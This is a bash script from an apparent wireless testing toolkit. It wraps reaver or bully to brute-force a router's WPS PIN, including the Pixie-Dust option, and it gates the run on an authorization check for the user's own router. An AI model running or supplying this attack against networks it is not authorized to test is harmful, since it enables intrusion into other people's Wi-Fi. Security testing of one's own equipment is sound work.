#!/usr/bin/env bash
# wps-attack.sh - WPS PIN-Attack mit reaver oder bully (eigener Router)
set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
source "$TOOLKIT/scripts/lib/logging.sh"
source "$TOOLKIT/scripts/lib/auth_check.sh"

IFACE="${1:-}"
BSSID="${2:-}"
CH="${3:-}"
TOOL="${4:-reaver}"   # reaver | bully

[[ -z "$IFACE" || -z "$BSSID" || -z "$CH" ]] && {
    echo "Usage: $0 <monitor_iface> <target_bssid> <channel> [reaver|bully]"
    exit 1
}
require_auth "$BSSID"

outdir="$(make_outdir captures wps-${BSSID//:/})"
log_info "WPS-Attack auf $BSSID (ch $CH) mit $TOOL"
log_warn "Eigener Router only. Manche Geraete sperren WPS bei Brute-Force."

case "$TOOL" in
    reaver)
        require_bin reaver
        sudo reaver -i "$IFACE" -b "$BSSID" -c "$CH" -vvv -K 1 \
            -o "$outdir/reaver.log" \
            || log_warn "reaver exit non-zero"
        # Pixie-Dust falls Pin gefunden
        log_info "Falls Pin in reaver.log -> in $outdir/ Notiz machen"
        ;;
    bully)
        require_bin bully
        sudo bully -b "$BSSID" -c "$CH" -d -v 3 "$IFACE" 2>&1 | tee "$outdir/bully.log"
        ;;
    *) log_err "Unbekanntes Tool: $TOOL"; exit 1 ;;
esac

log_ok "Output: $outdir"
